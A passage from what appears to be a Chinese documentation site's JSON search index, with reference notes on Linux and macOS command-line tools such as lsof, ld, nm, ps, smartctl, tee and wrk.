左右箭头：改变排序方式，默认是按IO排序。\nr：改变排序顺序。\no：只显示有IO输出的进程。\np：进程/线程的显示方式的切换。\na：显示累积使用量。\nq：退出。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-IOTOP.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-IOTOP.html"},{"title":"inotifywait","text":"监控文件夹变化, 适用于Linux 安装: brew install inotify-tools 使用inotifywait命令来监听文件夹变化的基本示例: inotifywait -m -r -e create,modify,delete /path/to/directory\n\n# -e create,modify,delete\n#   指定要监听的事件类型，包括文件的创建、修改和删除。\n# /path/to/directory：要监听的目标文件夹的路径。 -m 保持监听状态，持续监视文件夹的变化。 -r 递归地监听子目录。 运行以上命令后，inotifywait会一直运行并监听指定目录中的文件变化。\n当有新文件被创建、文件被修改或文件被删除时，它会输出相应的事件信息。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Inotifywait.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Inotifywait.html"},{"title":"jobs","text":"查看后台被挂起的进程, 一般用于 Ctrl + Z 手动挂起进程后的查看 通过 fg 命令可以恢复进程到前台执行; bg 命令恢复进程到后台执行: jobs  显示当前暂停的进程\nbg %N 使第N个任务在后台运行（%前有空格）\nfg %N 使第N个任务在前台运行","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Jobs.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Jobs.html"},{"title":"ldd","text":"用于打印程序或者库文件所依赖的共享库列表 安装(ubuntu, 待验证, mac下不行): apt install binutils 语法: ldd (选项) (参数) 选项 --version 打印指令版本号； -v 详细信息模式，打印所有相关信息； -u 打印未使用的直接依赖； -d 执行重定位和报告任何丢失的对象； -r 执行数据对象和函数的重定位，并且报告任何丢失的对象和函数； --help 显示帮助信息。 参数 文件：指定可执行程序或者文库。 原理 ldd不是一个可执行程序，而只是一个shell脚本 ldd能够显示可执行模块的dependency(所属)(所属)，\n其原理是通过设置一系列的环境变量，如下: LD_TRACE_LOADED_OBJECTS LD_WARN LD_BIND_NOW LD_LIBRARY_VERSION LD_VERBOSE 等 当LD_TRACE_LOADED_OBJECTS环境变量不为空时，任何可执行程序在运行时，\n它都会只显示模块的dependency(所属)，而程序并不真正执行。\n你可以在shell终端测试一下，如下： export LD_TRACE_LOADED_OBJECTS=1 再执行任何的程序，如ls等，看看程序的运行结果。 ldd显示可执行模块的dependency(所属)的工作原理，\n其实质是通过ld-linux.so（elf动态库的装载器）来实现的。\n我们知道，ld-linux.so模块会先于executable模块程序工作，并获得控制权，\n因此当上述的那些环境变量被设置时，ld-linux.so选择了显示可执行模块的dependency(所属)。\n实际上可以直接执行ld-linux.so模块，如: /lib/ld-linux.so.2 --list program 相当于ldd program","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-LDD.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-LDD.html"},{"title":"lpr","text":"用于将文件发送给指定打印机进行打印，如果不指定目标打印机，则使用默认打印机。 语法: lpr(选项)(参数) 选项 -E 与打印服务器连接时强制使用加密； -H 指定可选的打印服务器； -C 指定打印任务的名称； -P 指定接受打印任务的目标打印机； -U 指定可选的用户名； -h 关闭banner打印； -m 打印完成后发送E-mail； -r 打印完成后删除文件。 其他: -#    指定打印的份数； 参数 文件 需打印的文件。 实例 将man1和man2送到打印机lp进行打印: lpr -P lp man1 man2","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-LPR.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-LPR.html"},{"title":"lsof","text":"强大的查询工具，-i几乎万能（自吹） 关键选项\n默认 : 没有选项，lsof列出活跃进程的所有打开文件\n组合 : 可以将选项组合到一起，如-abc，但要当心哪些选项需要参数 -a 结果进行\"与\"运算（而不是\"或\"） -l 在输出显示用户ID而不是用户名 -h 获得帮助 -t 仅获取进程ID -U 获取UNIX套接口地址 -F 格式化输出结果，用于其它命令。\n可以通过多种方式格式化，如-F pcfn（用于进程id、命令名、文件描述符、文件名，并以空终止） -i 条件查询连接, 如指定协议: lsof -i tcp:$port -i（4,6，协议，：端口，@ip） -c 查看指定的命令正在使用的文件与网络连接    -c vim -u 显示指定用户打开了什么 -u <user> 消灭指定用户的所有东西    kill -9 lsof -t -u luyi -p 指定进程ID(pid)已经打开的文件    -p 643 +d 查看某目录文件信息    不加d也可以，但是可能不全 +D 递归查看某目录文件信息 更详细的描述以及恢复被删除的文件，某种情况\n可参考: https://www.cnblogs.com/sparkbj/p/7161669.html mac下查看指定端口是否有占用, 如查询 tcp的8080是否占用: lsof -i tcp:8080 使用这个主要是因为 mac 的 netstat 跟linux下有点不一样","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-LSOF.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-LSOF.html"},{"title":"ln","text":"功能 用来为文件创建链接，链接类型分为硬链接和符号链接两种，默认的链接类型是硬链接。如果要创建符号链接必须使用\"-s\"选项。 注意：符号链接文件不是一个独立的文件，它的许多属性依赖于源文件，所以给符号链接文件设置存取权限是没有意义的。 选项参数 ln选项参数 选项 说明 --backup[=CONTROL] 为每个已存在的目标文件创建备份文件 -b 类似--backup，但不接受任何参数 -d, -F, --directory 创建指向目录的硬链接(只适用于超级用户) -f, --force 强行删除任何已存在的目标文件 -i, --interactive 覆盖既有文件之前先询问用户； -L, --logical 取消引用作为符号链接的目标 -n, --no-dereference 把符号链接的目的目录视为一般文件； -P, --physical 直接将硬链接到符号链接 -r, --relative 创建相对于链接位置的符号链接 -s, --symbolic 对源文件建立符号链接，而非硬链接； -S, --suffix=SUFFIX 用\"-b\"参数备份目标文件后，备份文件的字尾会被加上一个备份字符串，预设的备份字符串是符号\"~\"，用户可通过\"-S\"参数来改变它； -t, --target-directory=DIRECTORY 指定要在其中创建链接的DIRECTORY -T, --no-target-directory 将\"LINK_NAME\"视为常规文件 -v, --verbose 打印每个链接文件的名称 --help 显示此帮助信息并退出 --version 显示版本信息并退出 注解 常用: ln -snf $src $dist","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Liaoning.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Liaoning.html"},{"title":"ld","text":"ld（Link eDitor）命令是二进制工具集 GNU Binutils 的一员，\n是 GNU 链接器，用于将目标文件与库链接为可执行文件或库文件 语法: ld [OPTIONS] OBJFILES ld 命令支持众多链接选项，但是大部分选项很少被使用，下面是 GNU ld 命令接受的选项 -b <input-format> 指定目标代码输入文件的格式 -B static 只使用静态库 -B dynamic 只使用动态库 -B symbolic 把引用捆绑到共享库中的全局符号 -c <MRI-commandfile> , --mri-script= <MRI-commandfile> 为与 MRI 链接器兼容，ld 接受由 MRI 命令语言编写的脚本文件 --cref 创建跨引用表 -d , -d c , -d p 即使指定了可重定位的输出文件（使用-r），也会为公共符号分配空间。脚本命令\"FORCE_COMMON_ALLOCATION\"具有相同的效果 -d efsym 在输出文件中创建指定的全局符号 -d emangle 在错误消息中还原符号名称 -e <entry> 使用指定的符号作为程序的初始执行点 -E , --export-dynamic 对于ELF格式文件，创建动态链接的可执行文件时，把所有符号添加到动态符号表 -f <name> , --auxiliary= <name> 对于 ELF 格式共享对象，设置 DT_AUXILIARY 名称 -F <name> , --filter= <name> 对于ELF格式共享对象，设置 DT_FILTER 名称。这告诉动态链接器，正在创建的共享对象的符号表应该用作共享对象名称的符号表的筛选器。 -g 被忽略。用于提供和其他工具的兼容性 -h 对于 ELF 格式共享对象，设置 DT_SONAME 名称 -I <file> , --dynamic-linker= <file> 指定动态链接器。这仅在生成依赖动态链接库的 ELF 可执行文件时才有意义。默认的动态链接器通常是正确的，除非您知道正在做什么，否则不要使用该选项。 -l <namespec> , --library= <namespec> 把指定的库文件添加到要链接的文件清单 -L <searchdir> , --library-path= searchdir 把指定的路径添加添加到搜索库的目录清单 -M , --print-map 显示链接映射，用于诊断目的 -m <emulation> 模拟指定的链接器 -N , --omagic 指定读取/写入文本和数据段 -n , --nmagic 关闭节的页面对齐，并禁用对共享库的链接。如果输出格式支持Unix样式的幻数，则将输出标记为\"NMAGIC\" -n oinhibit-exec 生成输出文件，即使出现非致命链接错误。通常，如果链接器在链接过程中遇到错误，它将不会生成输出文件。 -n o-keep-memory ld 通常在内存中缓存输入文件的符号表来优化内存使用速度。此选项告诉 ld 不要缓存符号表。当链接大型可执行文件时，如果ld耗尽内存空间，则可能需要使用该选项 -O <level> 对于非零的优化等级，ld将优化输出。此操作会比较耗时，应该在生成最终的结果时使用。 -o <output> , --output= <output> 指定输出文件的名称. 使用 format=<output-format> 指定输出文件的二进制格式 -R <filename> , --just-symbols= <filename> 从指定的文件读取符号名称和地址 -r , --relocatable 生成可重定位的输出（称为部分连接） -S , --strip-debug 忽略来自输出文件的调试器符号信息 -s , --strip-all 忽略来自输出文件的所有符号信息 -s hared , -B shareable 创建共享库 -t , --trace 在处理输入文件时显示它们的名称 -u <symbol> , --undefined= <symbol> 强制指定符号在输出文件中作为未定义符号 -v , -V , --version 示ld版本号 -w arn-common 当一个通用符号和另一个通用符号结合时发出警告 -w arn-constructors 如果没有使用任何全局构造器，则发出警告 -w arn-once 对于每个未定义的符号只发出一次警告 -w arn-section-align 如果为了对齐而改动了输出段地址，则发出警告 --whole-archive 对于指定的存档文件，在存档中包含所有文件 -X , --discard-locals 删除所有本地临时符号 -x , --discard-al 删除所有本地符号 其他: -Map <mapfile>:\n  将链接映射输出到指定的文件\n-rpath=<dir>\n  设置运行时共享库的搜索路径\n-rpath-link=<dir>\n  设置链接时共享库的搜索路径\n-split-by-file[=size]\n  为每个目标文件在输出文件中创建额外的段大小达到size。size默认为1\n-split-by-reloc[=count]\n  按照指定的长度在输出文件中创建额外的段\n--section-start=<sectionname>=<org>\n  在输出文件中指定的地址定位指定的段\n-T <scriptfile>, --script=<scriptfile>\n  使用 scriptfile 作为链接器脚本。此脚本将替换 ld 的默认链接器脚本（而不是添加到其中），因此脚本必须指定输出文件所需的所有内容。如果当前目录中不存在脚本文件，ld 会在 -L 选项指定的目录中查找\n-Ttext=<org>\n  使用指定的地址作为文本段的起始点\n-Tdata=<org>\n  使用指定的地址作为数据段的起始点\n-Tbss=<org>\n  使用指定的地址作为bss段的起始点","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-London.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-London.html"},{"title":"xz","text":"高压缩率的工具, 使用 LZMA2 压缩算法，\n生成的压缩文件比 POSIX 平台传统使用的 gzip、bzip2 生成的压缩文件更小，\n而且解压缩速度也很快，压缩或解压缩xz文件 语法: xz [OPTION]... [FILE]... 参数: -z , --compress 强制压缩 -d , --decompress , --uncompress force decompression, 解压 -t , --test 测试压缩文件的完整性 -l , --list 列出有关.xz文件的信息 -k , --keep 保留（不要删除）输入文件 -f , --force 强制覆盖输出文件和（解）压缩链接 -c , --stdout , --to-stdout 写入标准输出，不要删除输入文件\n使用7-9之前解压缩内存使用量考虑在内！ -e , --extreme 尝试通过使用更多的CPU时间来提高压缩比;\n要求不影响解压缩存储器 -q , --quiet 抑制警告; 指定两次以抑制错误 -v , --verbose 冗长; 指定两次更详细 -h , --help 显示这个简洁的帮助并退出 -H , --long-help 显示更多帮助（还列出了高级选项） -V , --version 显示版本号并退出s -T , --threads= <NUM> 最多使用NUM个线程; 默认值为1;  set to 0\n设置为0，使用与处理器内核一样多的线程 -0 ... -9         压缩预设; 默认为6; 取压缩机*和*","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Now.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Now.html"},{"title":"otool","text":"mac下指令, 类似linux的 ldd 如查看vim的链接: otool -L /usr/bin/vim -f print the fat headers -a print the archive header -h print the mach header -l print the load commands -L print shared libraries used -D print shared library id name -t print the text section (disassemble with -v) -p <routine name> start dissassemble from routine name -s <segname sectname> print contents of section -d print the data section -o print the Objective-C segment -r print the relocation entries -S print the table of contents of a library -T print the table of contents of a dynamic shared library -M print the module table of a dynamic shared library -R print the reference table of a dynamic shared library -I print the indirect symbol table -H print the two-level hints table -G print the data in code table -v print verbosely (symbolically) when possible -V print disassembled operands symbolically -c print argument strings of a core file -X print no leading addresses or headers -m don't use archive(member) syntax -B force Thumb disassembly (ARM objects only) -q use llvm's disassembler (the default) -Q use otool(1)'s disassembler -j print opcode bytes -C print linker optimization hints 其他: -mcpu=<arg>\n      use `arg' as the cpu for disassembly\n–version\n      print the version of otool","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-OTOOL-(MAC).html","loc":"/yq-docs-operating-system-linux-Linux-instruction-OTOOL-(MAC).html"},{"title":"ps","text":"用于报告当前系统的进程状态.\n可以搭配kill指令随时中断、删除不必要的程序。 ps命令是最基本同时也是非常强大的进程查看命令，\n使用该命令可以确定有哪些进程正在运行和运行的状态、\n进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等，\n总之大部分信息都是可以通过执行该命令得到. 选项: -a\n  显示所有终端机下执行的程序，除了阶段作业领导者之外。\na\n  显示现行终端机下的所有程序，包括其他用户的程序。\n-A\n  显示所有程序。\n-c\n  显示CLS和PRI栏位。\nc\n  列出程序时，显示每个程序真正的指令名称，而不包含路径，选项或常驻服务的标示。\n-C<指令名称>\n  指定执行指令的名称，并列出该指令的程序的状况。\n-d\n  显示所有程序，但不包括阶段作业领导者的程序。\n-e\n  此选项的效果和指定\"A\"选项相同。\ne\n  列出程序时，显示每个程序所使用的环境变量。\n-f\n  显示UID,PPIP,C与STIME栏位。\nf\n  用ASCII字符显示树状结构，表达程序间的相互关系。\n-g<群组名称>\n  此选项的效果和指定\"-G\"选项相同，当亦能使用阶段作业领导者的名称来指定。\ng\n  显示现行终端机下的所有程序，包括群组领导者的程序。\n-G<群组识别码>\n  列出属于该群组的程序的状况，也可使用群组名称来指定。\nh\n  不显示标题列。\n-H\n  显示树状结构，表示程序间的相互关系。\n-j或j\n  采用工作控制的格式显示程序状况。\n-l或l\n  采用详细的格式来显示程序状况。\nL\n  列出栏位的相关信息。\n-m或m\n  显示所有的执行绪。\nn\n  以数字来表示USER和WCHAN栏位。\n-N\n  显示所有的程序，除了执行ps指令终端机下的程序之外。\n-p<程序识别码>\n  指定程序识别码，并列出该程序的状况。\np<程序识别码>\n  此选项的效果和指定\"-p\"选项相同，只在列表格式方面稍有差异。\nr\n  只列出现行终端机正在执行中的程序。\n-s<阶段作业>\n  指定阶段作业的程序识别码，并列出隶属该阶段作业的程序的状况。\ns\n  采用程序信号的格式显示程序状况。\nS\n  列出程序时，包括已中断的子程序资料。\n-t<终端机编号>\n  指定终端机编号，并列出属于该终端机的程序的状况。\nt<终端机编号>\n  此选项的效果和指定\"-t\"选项相同，只在列表格式方面稍有差异。\n-T\n  显示现行终端机下的所有程序。\n-u<用户识别码>\n  此选项的效果和指定\"-U\"选项相同。\nu\n  以用户为主的格式来显示程序状况。\n-U<用户识别码>\n  列出属于该用户的程序的状况，也可使用用户名称来指定。\nU<用户名称>\n  列出属于该用户的程序的状况。\nv\n  采用虚拟内存的格式显示程序状况。\nx\n  显示所有程序，不以终端机来区分。\nX\n  采用旧式的Linux i386登陆格式显示程序状况。 关于ps 的 stat状态解释 状态说明: X    死掉的进程（未开启）\n<    高优先级\nN    低优先级\nL    有些页被锁进内存，有记忆体的分页分配并锁在记忆体内\ns    包含子进程，某一个会话的Leader进程\n\\+    位于后台的进程组，属于某个前台组的进程\nl    多线程，克隆线程 multi-threaded (using CLONE_THREAD, like NPTL pthreads do)\nWCHAN    正在等待的进程资源\nD    不可中断的进程，不可中断睡眠（通常是在IO操作）收到信号不唤醒和不可运行，进程必须等待直到有中断发生\nR    正在执行中，正在运行或可运行（在运行队列排队中）\nS    静止状态，可中断睡眠（休眠中，受阻，在等待某个条件的形成或接受到信号）\nT    暂停执行\nZ    僵尸进程，进程已终止，但进程描述符存在，直到父进程调用wait4()系统调用后释放\nW    没有足够的记忆体分页可分配 ，正在换页（2.6内核之前有效） 注解 关于grep搜索进程时, 排出自身, 见 GrepExclude","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-PS.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-PS.html"},{"title":"pwd","text":"print working directory 显示当前路径 -P 显示真实路径 而非链接路径","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-PWD.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-PWD.html"},{"title":"poweroff","text":"poweroff 会发送一个 ACPI 信号来通知系统关机: # poweroff           ### 关闭机器、关闭电源\n# poweroff --halt    ### 停止机器\n# poweroff --reboot  ### 重启机器","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Poweroff.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Poweroff.html"},{"title":"readelf","text":"参考: elf文件说明及介绍: https://zhuanlan.zhihu.com/p/112754720 https://www.jianshu.com/p/0599d846e1df https://zhuanlan.zhihu.com/p/30516267 用于显示 elf 格式文件的信息。 语法: readelf elf-file(s) readelf 用来显示一个或者多个 elf 格式的目标文件的信息，\n可以通过它的选项来控制显示哪些信息。这里的 elf-file(s) 就表示那些被检查的文件。\n可以支持32位，64位的 elf 格式文件，也支持包含 elf 文件的文档\n（这里一般指的是使用 ar 命令将一些 elf 文件打包之后生成的例如 lib*.a 之类的\"静态库\"文件）。 与 objdump 有点类似 选项(常用): -a 显示so文件所以信息 -h ELF文件头 -l program-headers 静态加载分析时需要的信息 -S section-headers 静态加载分析时需要的信息 -e 头信息，elf header，section header，program header -s 显示符号表 -d 显示动态节","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Readel.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Readel.html"},{"title":"smartctl","text":"功能 smartctl 工具用来实现操作系统上的 ATA/SATA 、SCSI/SAS、SSD 等物理设备的监控、分析及使用情况报告。 SMART 指的是对硬盘等设备的可靠性监控及预测磁盘可能存在的故障，并根据硬盘形态进行不同程度的自检。 smartctl 的版本可以兼容众多磁盘规范，例如 ACS-2、ATA8-ACS、ATA/ATAPI-7 及更早期的一些磁盘标准。 注解 大多发行版已经内置, 若没有, 可手动安装: apt install smartmontools smartmontools 提供了两种使用模式 以服务模式运行: 通过 smartd 服务及配置文件来对服务器上的磁盘按照规则进行自检，需要开启 smartd.service 服务 以命令行模式运行: 以终端命令行的方式对磁盘进行自检，无需开启 smartd 服务 注解 Mac可通过: brew install smartmontools 来安装, 并查看固态寿命 选项参数 基本命令参数选项(部分) 选项 说明 -h, --help, --usage Display this help and exit -V, --version, --copyright, --license Print license, copyright, and version information and exit -i, --info 显示设备基本信息 --identify[=[w][nvb]] Show words and bits from IDENTIFY DEVICE data (ATA) -g NAME, --get=NAME Get device setting. all, aam, apm, dsn, lookahead, security, wcache, rcache, wcreorder, wcache-sct -a, --all Show all SMART information for device -x, --xall Show all information for device --scan 查看系统所有设备 --scan-open Scan for devices and try to open each device -H, --health 检查健康状态 -t TEST, --test=TEST Run test. TEST. offline, short, long, conveyance, force, vendor,N, select,M-N, pending,N, afterselect,[on|off] -a 输出信息说明 严重警告（Critical Warning） 会显示控制器状态警告讯息，如果都显示0x00 就表示没事 温度（Temperature） 会显示当前SSD 温度资讯 可用备用空间（Available Spare） SSD 剩余空间百分比 可用备用临界值（Available Spare Threshold） 临界值全由厂商定义 寿命百分比（Percentage Used） 目前SSD 寿命百分比数值，具体取决于实际设备使用情况和厂商对设备寿命的预测。 资料读取（Data Units Read） 记录电脑从SSD读取512字节数据单元的总量，每1000个单元记录一次，即这项Raw数据1的值等于500KB。 资料写入（Data Units Read） 如上，就是写入总量。 主机读取命令（Host Read Commands） 主控收到的读取命令数量。 主机写入命令（Host Write Commands） 主控收到的写入命令数量。 控制器忙碌时间（Controller Busy Time） 主控忙于I/O命令的时间。 意外关机（Unsafe Shutdowns） 纪录不正常断电次数 媒体和资料完整性错误（Media and Data Integrity Errors） 主控检测得到的未恢复的数据完整性错误次数。 错误资料纪录（Number of Error Information Log Entries） 主控总共收到的错误信息日志数量。 示例 # 检查磁盘健康状态 smartctl -H /dev/sda # 然后查看磁盘详细情况 smartctl -a /dev/sda # 再对磁盘进行短期测试 smartctl -t short /dev/sda # 查看磁盘测试结果, 基本磁盘健康状态就可以定位出来 smartctl -l selftest /dev/sda # 最后检查磁盘错误日志 smartctl -l error /dev/sdb","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-SmartCTL.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-SmartCTL.html"},{"title":"nm","text":"linux下自带的特定文件分析工具，\n一般用来检查分析二进制文件、库文件、可执行文件中的符号表，返回二进制文件中各段的信息。 目标文件、库文件、可执行文件 首先，提到这三种文件，我们不得不提的就是gcc的编译流程：预编译，编译，汇编，链接。 目标文件 常说的目标文件是我们的程序文件(.c/.cpp,.h)经过\n预编译，编译，汇编过程生成的二进制文件,不经过链接过程，编译生成指令为: gcc(g++) -c file.c(file.cpp) 将生成对应的file.o文件,file.o即为二进制文件 库文件 分为静态库和动态库，这里不做过多介绍，库文件是由多个二进制文件打包而成，生成的.a文件，\n示例: ar -rsc liba.a test1.o test2.o test3.o 将test1.o test2.o test3.o三个文件打包成liba.a库文件 可执行文件 可执行文件是由多个二进制文件或者库文件(由上所得，库文件其实是二进制文件的集合)\n经过链接过程生成的一个可执行文件，对应windows下的.exe文件，\n可执行文件中有且仅有一个main()函数(用户程序入口，一般由bootloader指定，当然也可以改)，\n一般情况下，二进制文件和库文件中是不包含main()函数的，\n但是在linux下用户有绝对的自由，做一个包含main函数的库文件也是可以使用的,\n但这不属于常规操作，不作讨论。 上述三种文件的格式都是二进制文件。 为什么要用到nm 在上述提到的三种文件中，用编辑器是无法查看其内容的(乱码)，\n所以当我们有这个需求(例如debug，查看内存分布的时候)\n去查看一个二进制文件里包含了哪些内容时，这时候就将用到一些特殊工具，\nlinux下的nm命令就可以完全胜任(同时还有objdump和readelf工具，这里暂不作讨论)。 nm的常用命令参数 -A , -o , --print-file-name 打印出每个符号属于的文件 -a , --debug-syms 打印出所有符号，包括debug符号 -B BSD码显示 -C, --demangle[=style] 对低级符号名称进行解码，\nC++文件需要添加(不然看C++编译好的内容就是编码的) --no-demangle 不对低级符号名称进行解码，默认参数 -D , --dynamic 显示动态符号而不显示普通符号，一般用于动态库 -f format , --format= format 显示的形式，默认为bsd，可选为sysv和posix -g , --extern-only 仅显示外部符号 -h , --help 国际惯例，显示命令的帮助信息 -n , -v , --numeric-sort 显示的符号以地址排序，而不是名称排序 -p , --no-sort 不对显示内容进行排序 -P , --portability 使用POSIX.2标准 -V , --version 国际管理，查看版本 --defined-only 仅显示定义的符号(Display only defined symbols for each object file) 对-C解码C++的说明 比如源码定义了add函数: int add(int a, int b){return a+b;} 编译为动态库文件(Mac下不知道为什么像是个假的动态库, 因为没有动态库符号表): g++ -std=c++11 -dynamiclib -o libtest2.dylib test2.cpp 然后\nnm不带C查看: $ nm -n  libtest2.dylib\n0000000000003d80 T __Z3addii nm带C查看: $ nm -n -C libtest2.dylib\n0000000000003d80 T add(int, int) 关于输出数据的说明 以上为例: 0000000000003d80 T add(int, int) 第一列: 偏移地址 第二列: 当前条目所对应的内存所在部分 第三列: 符号内容 字符所对应的含义: A     ：符号的值是绝对值，不会被更改\nB或b  ：未被初始化的全局数据，放在.bss段\nD或d  ：已经初始化的全局数据\nG或g  ：指被初始化的数据，特指small objects\nI     ：另一个符号的间接参考\nN     ：debugging 符号\np     ：位于堆栈展开部分\nR或r  ：属于只读存储区\nS或s  ：指为初始化的全局数据，特指small objects\nT或t  ：代码段的数据，.test段\nU     ：符号未定义\nW或w  ：符号为弱符号，当系统有定义符号时，使用定义符号，当系统未定义符号且定义了弱符号时，使用弱符号。\n？    ：unknown符号 参考: linux下强大的文件分析工具 -- nm 关于符号表说明 主要是针对C++文件的编译 以下面数据为例 源码为: int add(int a, int b){\n  int tmp = a + 3;\n  return tmp + b;\n}\n\nextern \"C\"{\n  int add2(int a, int b){ return a+b+10;}\n} extern \"C\" 表示使用C标准导出函数, 意思是不会对函数名称进行修饰 编译指令: g++ -std=c++11 -dynamiclib -g -o libtest2.dylib test2.cpp 使用nm查看信息: $ nm -n -U libtest2.dylib\n0000000000003d60 T __Z3addii\n0000000000003d80 T _add2 对其进行解码: $ nm -n -CU libtest2.dylib\n0000000000003d60 T add(int, int)\n0000000000003d80 T _add2 如果要在其他地方进行提取, 如: // 定义原始函数指针类型\ntypedef int (*OrigAddFunc)(int a, int b);\n\n// 定义全局变量存储原始函数指针\nOrigAddFunc origAdd = NULL;\n\nvoid* handle = dlopen(\"./libtest2.dylib\", RTLD_LAZY);\nif (handle == NULL) {\n    printf(\"无法打开当前可执行文件\\n, info: %s\\n\", dlerror());\n    return 1;\n}\n\norigAdd = (OrigAddFunc)dlsym(handle, \"_Z3addii\");\nif (origAdd == NULL) {\n    printf(\"无法获取原始函数地址\\n, info: %s\\n\", dlerror());\n    dlclose(handle);\n    return 1;\n} 主要是 (OrigAddFunc)dlsym(handle, \"_Z3addii\"); ,\ndlsym是针对库文件的函数名进行寻找,\nC++默认会进行函数名修士, 所以如果要找 add 函数,\n得先用 nm 找出修饰后的名称 _Z3addii (输出去掉下划线), 使用解析后的是不行的 如果是 add2, 源码已经用 extern \"C\" 指定使用C标准导出, 就可直接 dlsym(handle, \"add2\")","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-So.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-So.html"},{"title":"su","text":"用户切换 用法: su [options] [-] [<user> [<argument>...]] -l 或者直接 - , 表示使用登录shell, 可以完全加载指定用户的环境 注解 这里简单提一下与 sudo 相关的, sudo -i 也可以切换到root用户, 不过切换过去后只是加载root到环境变量,\n并不是完全加载环境. 且执行的命令默认会有日志记录在 /var/log/sudo/ ,\n便于审计, 更安全.","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Sovereign.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Sovereign.html"},{"title":"tee","text":"读取标准输入的数据，并将其内容输出成文件(同时输出到终端与文件)。 语法: tee [-ai][--help][--version][文件...] 参数 -a,--append                     附加到既有文件的后面，而非覆盖它．\n-i,--ignore-interrupts  忽略中断信号。\n--help                                  在线帮助。\n--version                               显示版本信息。 实例 将 ls 的结果同时输出到屏幕与文件: ┌──(yanque㉿3675b5ebb8ce)-[~/test]\n└─$ ls -lh\ntotal 8.0K\n-rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file1\n-rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file2\n\n┌──(yanque㉿3675b5ebb8ce)-[~/test]\n└─$ ls -lh | tee t.log\ntotal 8.0K\n-rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file1\n-rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file2\n-rw-r--r-- 1 yanque yanque 0 Feb 25 06:43 t.log\n\n┌──(yanque㉿3675b5ebb8ce)-[~/test]\n└─$ cat t.log\ntotal 8.0K\n-rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file1\n-rw-r--r-- 1 yanque yanque 8 Feb 25 06:42 file2\n-rw-r--r-- 1 yanque yanque 0 Feb 25 06:43 t.log 注解 如果只是使用 tee, 会打开一个交互窗口, 在里面输入需要写入的内容, 退出直接 ctrl + c 即可","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-TEE.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-TEE.html"},{"title":"tput","text":"功能 tput 命令会利用 terminfo 数据库中的信息，来控制和更改我们的终端，比如控制光标、更改文本属性、控制屏幕，以及为文本涂色。 其中，为文本涂色的方法是: tput setab <color_int>：用于设置背景色 tput setaf <color_int>：用于设置前景色 tput sgr0：表示颜色重置 数值定义如下 数值 含义 0 黑 1 红 2 绿 3 黄 4 蓝 5 洋红 6 黄 7 白","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-TPUT.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-TPUT.html"},{"title":"ttyrec","text":"与 script , asciinema 类似,\n是 ttygif 配套的工具,\n用于录制 text/x-script 文件 text/x-script 文件: 保存了终端某段时间的执行情况, 可用户复现,\n比如生成gif图(需要使用ttygif) 安装: 与 ttygif 安装一致, 装好 ttygif 默认会带上 ttyrec","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-TTYRC.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-TTYRC.html"},{"title":"wrk","text":"轻量级性能压测工具 可以用来测试接口的性能如何,\n吞吐量能达到多少,\nQPS（Query per second 每秒处理完的请求数） 能达到多少呢 介绍 wrk 是一款针对 Http 协议的基准测试工具，它能够在单机多核 CPU 的条件下，\n使用系统自带的高性能 I/O 机制，\n如 epoll，kqueue 等，通过多线程和事件模式，对目标机器产生大量的负载。 注解 wrk 是复用了 redis 的 ae 异步事件驱动框架，\n准确来说 ae 事件驱动框架并不是 redis 发明的,\n它来至于 Tcl 的解释器 jim, 这个小巧高效的框架,\n因为被 redis 采用而被大家所熟知。 优势 轻量级性能测试工具; 安装简单（相对 Apache ab 来说）; 学习曲线基本为零，几分钟就能学会咋用了； 基于系统自带的高性能 I/O 机制，\n如 epoll, kqueue, 利用异步的事件驱动框架，\n通过很少的线程就可以压出很大的并发量； 劣势 wrk 目前仅支持单机压测，后续也不太可能支持多机器对目标机压测，\n因为它本身的定位，并不是用来取代 JMeter, LoadRunner 等专业的测试工具，\nwrk 提供的功能，对我们后端开发人员来说，应付日常接口性能验证还是比较友好的。 安装 wrk 只能被安装在类 Unix 系统上，所以我们需要一个 Linux 或者 MacOS 环境。\nWindows 10 安装需要开启自带的 Ubuntu 子系统。 对于Debian: 